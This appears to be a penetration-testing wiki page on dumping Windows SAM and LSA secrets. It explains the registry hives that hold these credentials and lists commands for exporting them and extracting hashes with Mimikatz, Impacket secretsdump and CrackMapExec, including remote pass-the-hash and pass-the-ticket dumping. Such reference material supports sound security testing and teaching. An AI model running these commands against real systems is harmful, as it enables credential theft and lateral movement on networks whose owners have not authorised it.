---
description: 'MITRE ATT&CK™ Sub-techniques T1003.002, T1003.004 and T1003.005'
---

# SAM & LSA secrets

## Theory

In Windows environments, passwords are stored in a hashed format in registry hives like SAM \(Security Account Manager\) and SECURITY.

<table>
  <thead>
    <tr>
      <th style="text-align:left">Hive</th>
      <th style="text-align:left">Details</th>
      <th style="text-align:left">Format or credential material</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">SAM</td>
      <td style="text-align:left">stores local cached credentials (referred to as SAM secrets)</td>
      <td style="text-align:left">LM or NT hashes</td>
    </tr>
    <tr>
      <td style="text-align:left">SECURITY</td>
      <td style="text-align:left">stores domain cached credentials (referred to as LSA secrets)</td>
      <td
      style="text-align:left">
        <p>Plaintext password</p>
        <p>LM or NT hash</p>
        <p>MS-CACHE (a.k.a. DCC1, NT hash derivation) or MS-CACHE v2 (a.k.a. DCC2,
          MS-CACHE derivation)</p>
        </td>
    </tr>
    <tr>
      <td style="text-align:left">SYSTEM</td>
      <td style="text-align:left">contains enough info to decrypt SAM secrets or LSA secrets</td>
      <td style="text-align:left">N/A</td>
    </tr>
  </tbody>
</table>

SAM and LSA secrets can be dumped either locally or remotely from the mounted registry hives. These secrets can also be extracted offline from the exported hives.

## Practice

### Exporting hives

When the Windows operating system is running, the hives are in use and mounted. The command-line tool named `reg` can be used to export them.

```bash
reg save HKLM\SAM 'C:\path\to\sam.save'
reg save HKLM\SECURITY 'C:\path\to\security.save'
reg save HKLM\SYSTEM 'C:\path\to\system.save'
```

When Windows is not running, the hives are not mounted and they can be copied just like any other file. This can be operated when mounting the hard drive from another OS \(e.g. when booting the computer on another operating system\). The hive files can be found at the following locations.

```bash
\system32\config\sam
\system32\config\security
\system32\config\system
```

### Dumping secrets

Here are some examples and tools that can be used for local/remote/offline dumping.

{% tabs %}
{% tab title="Mimikatz" %}
[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used locally to extract credentials from `SAM` and `SECURITY` registry hives \(and `SYSTEM` for the encryption keys\), or offline with hive dumps.

```bash
# Local dumping of SAM secrets on the target
lsadump::sam

# Offline dumping of SAM secrets from exported hives
lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'

# Local dumping of LSA secrets on the target
lsadump::secrets

# Offline dumping LSA secrets from exported hives
lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
```
{% endtab %}

{% tab title="secretsdump" %}
[Impacket](https://github.com/SecureAuthCorp/impacket)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) \(Python\) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like [pass-the-hash](../../abusing-ntlm/pass-the-hash.md) \(NTLM\), or [pass-the-ticket](../../abusing-kerberos/pass-the-ticket.md) \(Kerberos\).

```bash
# Remote dumping of SAM & LSA secrets
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'

# Remote dumping of SAM & LSA secrets (pass-the-hash)
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'

# Remote dumping of SAM & LSA secrets (pass-the-ticket)
secretsdump.py -k 'DOMAIN/USER@TARGET'

# Offline dumping of LSA secrets from exported hives
secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL

# Offline dumping of SAM secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL

# Offline dumping of SAM & LSA secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```
{% endtab %}

{% tab title="CrackMapExec" %}
[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like [pass-the-hash](../../abusing-ntlm/pass-the-hash.md) \(NTLM\), or [pass-the-ticket](../../abusing-kerberos/pass-the-ticket.md) \(Kerberos\)

```bash
# Remote dumping of SAM/LSA secrets
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa

# Remote dumping of SAM/LSA secrets (local user authentication)
crackmapexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam/--lsa

# Remote dumping of SAM/LSA secrets (pass-the-hash)
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa

# Remote dumping of SAM/LSA secrets (pass-the-ticket)
crackmapexec smb $TARGETS --kerberos --sam/--lsa
```
{% endtab %}
{% endtabs %}

[https://book.hacktricks.xyz/windows/stealing-credentials](https://book.hacktricks.xyz/windows/stealing-credentials) [https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a](https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a) [https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz\#lsadump](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz#lsadump) [https://adsecurity.org/?p=1275](https://adsecurity.org/?p=1275) [https://pure.security/dumping-windows-credentials/](https://pure.security/dumping-windows-credentials/) [https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633](https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633)

## References

{% embed url="http://moyix.blogspot.com/2008/02/syskey-and-sam.html" caption="" %}

{% embed url="http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html" caption="" %}

